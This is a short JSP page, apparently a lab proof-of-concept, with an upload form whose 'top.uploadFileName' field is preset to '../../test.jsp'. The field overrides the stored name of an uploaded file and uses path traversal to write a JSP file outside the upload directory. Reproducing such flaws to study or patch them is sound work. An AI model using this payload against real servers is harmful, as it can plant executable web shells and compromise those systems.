<%--
  Created by IntelliJ IDEA.
  User: hejixiong
  Date: 2025/4/25
  Time: 10:49
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>Title</title>
</head>
<body>
<form action="/upload" method="post" enctype="multipart/form-data">
    <input type="file" name="upload">
    <input type="text" name="top.uploadFileName" value="../../test.jsp">
    <input type="submit" value="上传">
</form>
</body>
</html>
